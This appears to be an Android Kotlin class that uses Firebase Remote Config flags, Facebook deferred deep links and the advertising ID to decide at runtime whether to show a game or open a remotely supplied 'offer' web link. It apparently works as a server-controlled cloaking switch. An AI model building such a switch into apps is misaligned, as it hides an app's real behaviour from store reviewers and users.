package io.myfirst.library.managers

import android.app.Activity
import android.util.Log
import io.myfirst.library.Constants.TAG
import io.myfirst.library.callbacks.RemoteListenerCallback
import io.myfirst.library.utils.Utils
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import android.os.StrictMode
import android.os.StrictMode.ThreadPolicy
import com.facebook.applinks.AppLinkData
import io.myfirst.library.AppsProjector
import io.myfirst.library.AppsProjector.deepLink
import io.myfirst.library.AppsProjector.preferences
import io.myfirst.library.Constants.ONCONVERSION
import io.myfirst.library.Constants.ONDEEPLINK
import io.myfirst.library.storage.persistroom.model.Link
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch


class FirebaseRemoteListener(private val activity: Activity) {


    private lateinit var remoteListenerCallback: RemoteListenerCallback


    fun getDeepLink(){

        Utils.getAdId(activity)

        when (preferences.getOnDeepLinkDataSuccess(ONDEEPLINK)) {
            "null" -> {

                AppLinkData.fetchDeferredAppLinkData(activity) {
                    when (it) {
                        null -> {
                            preferences.setOnDeepLinkDataSuccess(ONDEEPLINK, "false")
                            fetchMainCycle()
                        }

                        else -> {
                            deepLink = it.targetUri.toString()
                            Log.d("testing", it.targetUri.toString())
                            preferences.setOnDeepLinkDataSuccess(ONDEEPLINK, "true")
                            remoteListenerCallback.onDeepLinkSuccess(Firebase.remoteConfig.getString("offer"), it.targetUri.toString())
                        }
                    }
                }

            }

            "true" -> {
                createBase()
            }

            "false" -> {
                fetchMainCycle()
            }


        }



    }

    fun initialize() {

        val policy = ThreadPolicy.Builder().permitAll().build()

        StrictMode.setThreadPolicy(policy)


        remoteListenerCallback = activity as RemoteListenerCallback

        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }


        Firebase.remoteConfig.setConfigSettingsAsync(configSettings)

        Firebase.remoteConfig.fetchAndActivate().addOnCompleteListener(activity) { task ->


            if (task.isSuccessful) {

                Log.d(TAG, "status - " + Firebase.remoteConfig.getString("status"))
                Log.d(TAG, "check - " + Firebase.remoteConfig.getString("check"))
                Log.d(TAG, "link - " + Firebase.remoteConfig.getString("offer"))


                when (Firebase.remoteConfig.getString("status")) {
                    "false" -> {
                        remoteListenerCallback.onStatusFalse()
                    }

                    "true" -> {
                        remoteListenerCallback.onStatusTrue()

                        when (200) {

                            200 -> {

                                //  Constants.part1 = Firebase.remoteConfig.getString("offer")
                                Log.d(TAG, "response code 200")
                                getDeepLink()

                            }

                            404 -> {
                                remoteListenerCallback.onFalseCode(404)
                                Log.d(TAG, "response code 400")
                                // startGame()

                            }

                            0 -> {

                                remoteListenerCallback.onFalseCode(0)
                                Log.d(TAG, "response code 0")
                                //  Toast.makeText(this, "No Ethernet!", Toast.LENGTH_SHORT).show()
                                //  startGame()
                            }
                        }

                    }

                }
            } else {

            }

        }

    }


    fun fetchMainCycle(){

        when (preferences.getOnConversionDataSuccess(ONCONVERSION)) {
            "null" -> {
                Log.d(TAG, "null - OnConversion")
                remoteListenerCallback.onSuccessCode(Firebase.remoteConfig.getString("offer"))

            }

            "true" -> {
                createBase()
            }

        }
    }


    fun createBase(){
        GlobalScope.launch(Dispatchers.IO) {
            var list = AppsProjector.createRepoInstance(activity).getAllData()

            Log.d(TAG, "$list main list")
            if(list.contains(Link(1, "false"))){
                Log.d(TAG, "exist 2 element" + " starting game")

            } else if(list.isEmpty()) {
                Log.d(TAG, "exist 2 element" + " starting game")

            } else {
                Log.d(TAG, "exist 1 element" + " starting web")
                Log.d(TAG, list[0].link.toString())
                // Reobject.ASWV_URL = list[0].link.toString()
                remoteListenerCallback.nonFirstLaunch(list[0].link.toString())

            }

        }
    }
}